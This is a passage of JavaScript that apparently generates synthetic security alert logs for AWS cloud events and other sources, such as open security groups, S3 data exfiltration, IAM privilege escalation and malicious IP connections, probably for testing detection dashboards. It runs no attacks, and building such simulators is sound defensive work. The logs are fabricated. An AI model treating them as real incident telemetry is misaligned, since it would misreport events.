    else if (useCase.includes('Creation or Modification of Security Group Rules Allowing Wide Access')) {
        log = {
            ...log,
            title: "Security Group Rule Modified for Wide Access",
            description: `Security Group "${getRandomElement(['web-sg', 'db-sg'])}" rule modified to allow wide access (0.0.0.0/0) on port ${getRandomElement([22, 3389, 8080])}. High risk.`,
            event_subtype: "SecurityGroupModification", // More specific subtype
            event_name: "AuthorizeSecurityGroupIngress",
            security_group_id: "sg-xxxxxxxx",
            ip_protocol: "tcp",
            from_port: getRandomElement([22, 3389, 8080]),
            to_port: getRandomElement([22, 3389, 8080]),
            ip_ranges: ["0.0.0.0/0"],
            log_level: "Critical"
        };
    }
    else if (useCase.includes('Lambda Function Execution from Suspicious Source IPs')) {
        log = {
            ...log,
            title: "Lambda Function Executed from Suspicious IP",
            description: `AWS Lambda function "${getRandomElement(['process-data', 'malicious-trigger'])}" invoked from a suspicious IP address (${log.source_ip}).`,
            event_subtype: "LambdaExecution", // More specific subtype
            event_name: "InvokeFunction",
            function_name: getRandomElement(['process-data', 'malicious-trigger']),
            log_level: "High"
        };
    }
    else if (useCase.includes('High Volume Data Transfer from S3 Buckets to External IPs')) {
        log = {
            ...log,
            title: "High Volume Data Transfer from S3 to External IP",
            description: `High volume (${Math.floor(Math.random() * 500) + 50} MB) data transfer from S3 bucket "${getRandomElement(['confidential-docs', 'customer-data'])}" to external IP ${getRandomElement(EXTERNAL_IPS)}.`,
            event_subtype: "S3DataExfiltration", // More specific subtype
            event_name: "GetObject",
            s3_bucket: getRandomElement(['confidential-docs', 'customer-data']),
            data_transferred_mb: Math.floor(Math.random() * 500) + 50,
            destination_ip: getRandomElement(EXTERNAL_IPS),
            log_level: "Critical"
        };
    }
    else if (useCase.includes('Suspicious API Calls Indicating Possible Privilege Escalation')) {
        log = {
            ...log,
            title: "Suspicious API Calls for Privilege Escalation",
            description: `User ${user.username} made suspicious API calls (e.g., "AttachUserPolicy") indicative of privilege escalation attempts.`,
            event_subtype: "PrivilegeEscalationAttempt", // More specific subtype
            event_name: "AttachUserPolicy",
            target_user: user.username,
            policy_arn: "arn:aws:iam::aws:policy/AdministratorAccess",
            log_level: "Critical"
        };
    }
    else if (useCase.includes('Creation of Publicly Accessible S3 Buckets')) {
        log = {
            ...log,
            title: "Publicly Accessible S3 Bucket Created",
            description: `A new S3 bucket "${getRandomElement(['public-data-bucket', 'unsecured-files'])}" was created and set to be publicly accessible, posing a data leak risk.`,
            event_subtype: "S3BucketPublicExposure", // More specific subtype
            event_name: "CreateBucket",
            s3_bucket_name: getRandomElement(['public-data-bucket', 'unsecured-files']),
            public_access: true,
            log_level: "Critical"
        };
    }
    else if (useCase.includes('Deletion or Modification of IAM Policies Without Approval')) {
        log = {
            ...log,
            title: "IAM Policy Deletion/Modification Without Approval",
            description: `IAM policy "${getRandomElement(['AdminPolicy', 'SecurityPolicy'])}" was deleted or modified by ${user.username} without apparent approval.`,
            event_subtype: "IAMPolicyModification", // More specific subtype
            event_name: getRandomElement(["DeletePolicy", "CreatePolicyVersion"]),
            policy_name: getRandomElement(['AdminPolicy', 'SecurityPolicy']),
            log_level: "Critical"
        };
    }
    else if (useCase.includes('Use of Unapproved Regions for Resource Deployment')) {
        log = {
            ...log,
            title: "Resource Deployment in Unapproved AWS Region",
            description: `Resources deployed in an unapproved AWS region (${getRandomElement(['ap-northeast-1', 'ca-central-1'])}). Policy violation.`,
            event_subtype: "RegionPolicyViolation", // More specific subtype
            event_name: "RunInstances",
            region: getRandomElement(['ap-northeast-1', 'ca-central-1']),
            log_level: "High"
        };
    }
    else if (useCase.includes('Suspicious Activity Detected by GuardDuty (Threat Detection Service)')) {
        log = {
            ...log,
            title: "GuardDuty Alert: Suspicious Activity",
            description: `AWS GuardDuty detected suspicious activity (e.g., PortScan, UnauthorizedAccess) involving EC2 instance ${getRandomElement(['i-xxxxxxxx', 'i-yyyyyyyy'])} from ${log.source_ip}.`,
            event_subtype: "GuardDutyFinding", // More specific subtype
            event_name: "GuardDuty Finding",
            finding_type: getRandomElement(["Recon:EC2/PortScan", "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration"]),
            resource_affected: "i-xxxxxxxx",
            log_level: "High"
        };
    }
    else if (useCase.includes('Suspicious Changes to VPC Network ACLs or Route Tables')) {
        log = {
            ...log,
            title: "Suspicious VPC Network ACL/Route Table Changes",
            description: `Suspicious modifications to VPC Network ACLs or Route Tables detected, potentially altering network flow for malicious purposes.`,
            event_subtype: "VPCNetworkModification", // More specific subtype
            event_name: getRandomElement(["CreateNetworkAclEntry", "ReplaceRoute"]),
            resource_type: getRandomElement(["Network ACL", "Route Table"]),
            log_level: "Critical"
        };
    }
    else if (useCase.includes('IAM User Credentials Used Outside Normal Business Hours')) {
        log = {
            ...log,
            title: "IAM Credentials Used Off-Hours",
            description: `IAM user ${user.username} credentials used outside normal business hours (${timestamp.getHours()}h). Potential compromise or abuse.`,
            event_subtype: "IAMOffHoursUsage", // More specific subtype
            event_name: "AssumeRole",
            activity_time: timestamp.toLocaleTimeString('en-US', { hour12: false }),
            log_level: "High"
        };
    }
    else if (useCase.includes('Use of Temporary Credentials for Long-Running Sessions')) {
        log = {
            ...log,
            title: "Temporary Credentials Used for Long Session",
            description: `Temporary credentials (e.g., from STS AssumeRole) were used for an unusually long-running session by ${user.username}.`,
            event_subtype: "LongRunningSession", // More specific subtype
            event_name: "AssumeRole",
            session_duration_seconds: Math.floor(Math.random() * 3600) + 3600 * 8, // 8-9 hours
            log_level: "Medium"
        };
    }
    else if (useCase.includes('Multiple Failed Attempts to Access AWS KMS Keys')) {
        log = {
            ...log,
            title: "Multiple Failed AWS KMS Key Access Attempts",
            description: `Multiple failed attempts to access AWS KMS Key "${getRandomElement(['alias/mykey', 'arn:aws:kms:region:account:key/key-id'])}" by ${user.username}.`,
            event_subtype: "KMSAccessFailure", // More specific subtype
            event_name: "Decrypt",
            kms_key_arn: getRandomElement(['alias/mykey', 'arn:aws:kms:region:account:key/key-id']),
            failed_attempts: Math.floor(Math.random() * 10) + 3,
            log_level: "High"
        };
    }
    else if (useCase.includes('EC2 Instance Communicating with Known Malicious IPs')) {
        log = {
            ...log,
            title: "EC2 Instance Communicating with Malicious IP",
            description: `EC2 instance "${getRandomElement(['i-webserver', 'i-database'])}" initiated communication with known malicious IP ${getRandomElement(MALICIOUS_IPS)}.`,
            event_subtype: "EC2MaliciousConnection", // More specific subtype
            event_name: "NetworkConnection",
            instance_id: getRandomElement(['i-webserver', 'i-database']),
            destination_ip: getRandomElement(MALICIOUS_IPS),
            log_level: "Critical"
        };
    }
    else if (useCase.includes('Suspicious Cross-Account Access or Resource Sharing')) {
        log = {
            ...log,
            title: "Suspicious Cross-Account Access/Resource Sharing",
            description: `Suspicious cross-account access or resource sharing activity detected (e.g., "PutBucketPolicy" allowing external account) by ${user.username}.`,
            event_subtype: "CrossAccountAccess", // More specific subtype
            event_name: "PutBucketPolicy",
            target_account: "111122223333",
            log_level: "Critical"
        };
    }

    return log;
}


/**
 * Main dispatcher function to generate logs based on data source and use cases.
 * This is the function that should be imported and called from other components.
 */
export function generateUseCaseBasedLogs(dataSource, count, context) {
    console.log(`[USE CASE LOG GENERATOR] Generating ${count} ${dataSource} logs...`);
    const logs = [];
    const useCases = USE_CASES_DATABASE[dataSource] || []; // Using USE_CASES_DATABASE as per original code structure

    if (useCases.length === 0) {
        console.warn(`[USE CASE LOG GENERATOR] No use cases found for source: ${dataSource}`);
        return [];
    }

    for (let i = 0; i < count; i++) {
        const randomUseCase = getRandomElement(useCases);
        let generatedLog;
        try {
            switch (dataSource) {
                case 'EDR':
                    generatedLog = generateEDRLog(randomUseCase, context);
                    break;
                case 'DNS':
                    generatedLog = generateDNSLog(randomUseCase, context);
                    break;
                case 'Office365':
                    generatedLog = generateOffice365Log(randomUseCase, context);
                    break;
                case 'ActiveDirectory':
                    generatedLog = generateActiveDirectoryLog(randomUseCase, context);
                    break;
                case 'DLP':
                    generatedLog = generateDLPLog(randomUseCase, context);
                    break;
                case 'Azure':
                    generatedLog = generateAzureLog(randomUseCase, context);
                    break;
                case 'AWS':
                    generatedLog = generateAWSLog(randomUseCase, context);
                    break;
                default:
                    console.warn(`[USE CASE LOG GENERATOR] Unknown source type: ${dataSource}`);
                    // Create a generic fallback log
                    generatedLog = {
                        event_time: new Date().toISOString(),
                        log_source: dataSource,
                        title: `Generic Event for ${dataSource}`,
                        description: `Use Case: ${randomUseCase}`,
                        log_level: "Medium"
                    };
                    break; // Added break for default case
            }
            if (generatedLog) { // Simplified validation as logs should always have a title initialized
               logs.push(generatedLog);
               console.log(`[USE CASE LOG GENERATOR] Generated log ${i + 1}: ${generatedLog.title}`);
            } else {
                console.warn(`[USE CASE LOG GENERATOR] Generated log ${i + 1} is invalid or null:`, generatedLog);
            }
        } catch (error) {
            console.error(`[USE CASE LOG GENERATOR] Error generating log ${i + 1} for ${dataSource} with use case "${randomUseCase}":`, error);
        }
    }

    console.log(`[USE CASE LOG GENERATOR] Successfully generated ${logs.length} logs for ${dataSource}`);
    return logs;
}


// Utility functions
function getRandomWeightedElement(elements, weights) {
    const random = Math.random();
    let weightSum = 0;
    for (let i = 0; i < elements.length; i++) {
        weightSum += weights[i];
        if (random <= weightSum) {
            return elements[i];
        }
    }
    return elements[elements.length - 1];
}

function generateGuid() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        const r = Math.random() * 16 | 0;
        const v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

function getVendorForDataSource(dataSource) {
    const vendors = {
        EDR: "CrowdStrike",
        DNS: "Cisco",
        Office365: "Microsoft",
        ActiveDirectory: "Microsoft",
        DLP: "Symantec",
        Azure: "Microsoft",
        AWS: "Amazon"
    };
    return vendors[dataSource] || "Security Vendor";
}

function getProductForDataSource(dataSource) {
    const products = {
        EDR: "Falcon",
        DNS: "Umbrella",
        Office365: "Office 365",
        ActiveDirectory: "Active Directory",
        DLP: "DLP Protect",
        Azure: "Azure Security Center",
        AWS: "CloudTrail"
    };
    return products[dataSource] || "Security Product";
}

// generateGenericLog is no longer directly used by generateLogForUseCase as each log type now handles its own default/generic title/description
// Leaving it here as a utility but it's not called in the new flow.
function generateGenericLog(useCase, user, hostname, context) {
    return {
        event_subtype: "SecurityEvent",
        title: "Security Event Detected",
        description: `Security event related to: ${useCase}. User: ${user.name}, Host: ${hostname}`,
        firedtimes: 1
    };
}

export default generateUseCaseBasedLogs;
